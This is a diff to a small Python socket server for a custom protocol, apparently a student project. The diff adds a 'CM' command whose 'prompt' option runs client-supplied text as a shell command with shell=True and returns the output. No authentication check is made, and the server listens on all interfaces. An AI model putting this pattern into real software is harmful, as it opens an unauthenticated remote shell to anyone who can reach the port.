@@ -3,6 +3,7 @@ Author: Siyaa Sathyan (UID:433004781)
 """
 import socket
 import threading
+import subprocess
 host = "0.0.0.0"
 port = 9999
 
@@ -17,7 +18,6 @@ ERROR_CODES = {
 class Client:
     """Holds the info about a connected client."""
     def __init__(self, conn, addr):
-        
         self.conn = conn # the client socket
         self.addr = addr # the client address
         self.secure = False # this client encryption flag
@@ -44,6 +44,37 @@ def handle_start(client, fields):
         
     #reply with confirmation packet: (SC, RFMP, v1.0, 0|1)
     return "(CC)"
+
+def handle_prompt(cmd_text):
+    """Run a shell command on the server and return its output."""
+    if not cmd_text:
+        return make_error("E03")
+    try:
+        result = subprocess.run(
+            cmd_text,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=15,
+        )
+        output = (result.stdout or "") + (result.stderr or "")
+        return f"(SC,{output.strip() or 'OK'})"
+    except Exception:
+        return make_error("E03")
+
+
+def handle_command(client, fields):
+    """Handle a Command (CM) packet: (CM, cmd_type, args...)."""
+    if not fields:
+        return make_error("E01")
+
+    cmd_type = fields[0]
+    args = ", ".join(fields[1:]) if len(fields) > 1 else ""
+
+    if cmd_type == "prompt":
+        return handle_prompt(args)
+
+    return make_error("E01")
     
 def handle_client(conn, addr):
     """Serve one client connection"""
@@ -61,6 +92,8 @@ def handle_client(conn, addr):
 
         if ptype == "SS":
             reply = handle_start(sess,fields)
+        elif ptype == "CM":
+            reply = handle_command(sess,fields)
         else:
             reply = make_error("E01")
 
